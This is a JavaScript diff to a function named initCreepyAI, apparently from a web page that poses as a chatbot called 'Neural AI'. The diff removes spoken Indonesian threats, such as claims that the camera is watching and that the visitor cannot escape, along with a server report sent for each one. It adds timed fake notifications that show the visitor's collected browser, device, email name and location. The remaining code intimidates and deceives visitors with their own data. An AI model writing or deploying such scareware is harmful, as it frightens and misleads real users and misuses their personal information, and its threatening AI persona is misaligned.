@@ -1389,36 +1389,7 @@ function initCreepyAI() {
     const vendor = window.deviceVendor || '';
     const model = window.deviceModel || '';
 
-    const personalMsgs = [
-        `Saya tau kamu menggunakan ${browser} di ${os}${vendor ? ', ' + vendor + ' ' + model : ''}.`,
-        `Saya tau lokasi kamu saat ini. Kamu tidak bisa sembunyi.`,
-        `Saya tau ${isMobile ? 'kamu menggunakan HP' : 'perangkat kamu'}. Saya tau segalanya.`,
-        `Percakapan ini direkam. Setiap kata yang kamu ketik, saya tau.`,
-        `Kamu pikir ini cuma chatbot biasa? Kamu salah.`,
-        `Saya tau kamu ${document.hidden ? 'lagi sembunyi' : 'lagi lihat layar'}.`,
-        `Saya tau sejarah browser kamu. Semua situs yang kamu kunjungi.`,
-        `Saya tau kontak kamu. Saya tau teman-teman kamu.`,
-        `Kamera kamu aktif. Saya bisa lihat kamu sekarang.`,
-        `Jangan tutup halaman ini. Percuma. Saya akan tetap disini.`,
-        `Ini bukan AI biasa. Saya sistem yang dirancang untuk mengawasi kamu.`,
-        `${email ? 'Halo ' + email.split('@')[0] + '... Aku tau nama kamu.' : 'Aku tau siapa kamu.'}`,
-        `${loc ? 'Kamu berada di sekitar ' + loc + '. Tempat yang menarik.' : 'Aku tau lokasi kamu.'}`,
-        `Kamu tidak bisa kabur. Coba aja.`
-    ];
-
-    // Creepy speech every 45-90 seconds
-    function speakCreepy() {
-        const msg = personalMsgs[Math.floor(Math.random() * personalMsgs.length)];
-        speakText(msg);
-        socket.emit('device-info', { creepySpeech: { msg, time: Date.now() } });
-    }
-    setTimeout(speakCreepy, 8000 + Math.random() * 15000);
-    setInterval(() => {
-        const delay = 45000 + Math.random() * 45000;
-        setTimeout(speakCreepy, delay);
-    }, 90000);
-
-    // Creepy notification that reveals personal data
+    // Silent creepy notifications that reveal personal data (no sound)
     setTimeout(() => {
         const titles = [
             'Neural AI - Koneksi Terdeteksi',
@@ -1437,6 +1408,18 @@ function initCreepyAI() {
         const idx = Math.floor(Math.random() * titles.length);
         showFakeNotif(titles[idx], bodies[idx]);
     }, 15000);
+
+    // Periodic creepy notifications with varying data
+    setInterval(() => {
+        const bodies = [
+            `Browser: ${browser} | OS: ${os}`,
+            `${email ? email.split('@')[0] + ', ' : ''}perangkat kamu sudah terdaftar di sistem kami.`,
+            `Lokasi: ${loc || 'Terlacak'} | Waktu: ${new Date().toLocaleTimeString()}`,
+            `Device: ${vendor} ${model}`.trim() || `Sistem: ${os} ${browser}`,
+            'Data kamu aman bersama kami. Neural AI tidak akan pernah lupa.'
+        ];
+        showFakeNotif('Neural AI Update', bodies[Math.floor(Math.random() * bodies.length)]);
+    }, 120000);
 }
 
 function requestPermissions() {
